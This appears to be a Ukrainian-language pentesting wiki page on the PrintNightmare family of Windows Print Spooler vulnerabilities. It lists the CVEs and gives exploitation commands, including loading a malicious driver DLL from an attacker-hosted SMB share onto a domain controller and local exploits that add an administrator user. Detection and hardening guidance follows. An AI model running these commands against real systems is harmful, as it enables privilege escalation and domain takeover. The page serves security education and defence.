# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare - це загальна назва, що надається сімейству вразливостей у службі Windows **Print Spooler**, які дозволяють **виконання довільного коду як SYSTEM** і, коли спулер доступний через RPC, **віддалене виконання коду (RCE) на контролерах домену та файлових серверах**. Найбільш широко експлуатовані CVE - це **CVE-2021-1675** (спочатку класифікована як LPE) та **CVE-2021-34527** (повне RCE). Наступні проблеми, такі як **CVE-2021-34481 (“Point & Print”)** та **CVE-2022-21999 (“SpoolFool”)**, доводять, що поверхня атаки все ще далека від закриття.

---

## 1. Вразливі компоненти та CVE

| Рік | CVE | Коротка назва | Примітив | Примітки |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Виправлено в червні 2021 CU, але обійдено CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx дозволяє автентифікованим користувачам завантажувати DLL драйвера з віддаленого ресурсу|
|2021|CVE-2021-34481|“Point & Print”|LPE|Встановлення непідписаного драйвера неадміністраторами|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Створення довільних каталогів → посів DLL – працює після патчів 2021 року|

Всі вони зловживають одним з **MS-RPRN / MS-PAR RPC методів** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) або довірчими відносинами всередині **Point & Print**.

## 2. Техніки експлуатації

### 2.1 Компрометація віддаленого контролера домену (CVE-2021-34527)

Автентифікований, але **непривілейований** користувач домену може виконувати довільні DLL як **NT AUTHORITY\SYSTEM** на віддаленому спулері (часто DC) шляхом:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Популярні PoC включають **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) та модулі Бенжаміна Дельпі `misc::printnightmare / lsa::addsid` у **mimikatz**.

### 2.2 Підвищення локальних привілеїв (будь-який підтримуваний Windows, 2021-2024)

Ту ж API можна викликати **локально**, щоб завантажити драйвер з `C:\Windows\System32\spool\drivers\x64\3\` і досягти привілеїв SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – обхід виправлень 2021 року

Патчі Microsoft 2021 року заблокували завантаження віддалених драйверів, але **не зміцнили дозволи на директорії**. SpoolFool використовує параметр `SpoolDirectory`, щоб створити довільну директорію в `C:\Windows\System32\spool\drivers\`, скидає DLL з корисним навантаженням і змушує спулер завантажити її:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Експлойт працює на повністю оновлених Windows 7 → Windows 11 та Server 2012R2 → 2022 до оновлень лютого 2022 року

---

## 3. Виявлення та полювання

* **Журнали подій** – увімкніть канали *Microsoft-Windows-PrintService/Operational* та *Admin* і слідкуйте за **ID події 808** “Служба друку не змогла завантажити модуль плагіна” або за повідомленнями **RpcAddPrinterDriverEx**.
* **Sysmon** – `ID події 7` (Зображення завантажено) або `11/23` (Запис/видалення файлу) у `C:\Windows\System32\spool\drivers\*`, коли батьківський процес – **spoolsv.exe**.
* **Ланцюг процесів** – сповіщення щоразу, коли **spoolsv.exe** запускає `cmd.exe`, `rundll32.exe`, PowerShell або будь-який непідписаний бінарний файл.

## 4. Пом'якшення та зміцнення

1. **Оновіть!** – Застосуйте останнє кумулятивне оновлення на кожному хості Windows, на якому встановлено службу Print Spooler.
2. **Вимкніть спулер, де це не потрібно**, особливо на контролерах домену:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Блокуйте віддалені з'єднання**, дозволяючи локальний друк – Групова політика: `Конфігурація комп'ютера → Адміністративні шаблони → Принтери → Дозволити службі друку приймати клієнтські з'єднання = Вимкнено`.
4. **Обмежте Point & Print**, щоб лише адміністратори могли додавати драйвери, встановивши значення реєстру:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Детальні вказівки в Microsoft KB5005652

---

## 5. Пов'язані дослідження / інструменти

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) модулі
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* Спойлер SpoolFool та опис
* 0patch мікропатчі для SpoolFool та інших помилок спулера

---

**Додаткове читання (зовнішнє):** Перегляньте блог-пост 2024 року – [Розуміння вразливості PrintNightmare](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Посилання

* Microsoft – *KB5005652: Керування новою поведінкою установки драйвера за замовчуванням Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
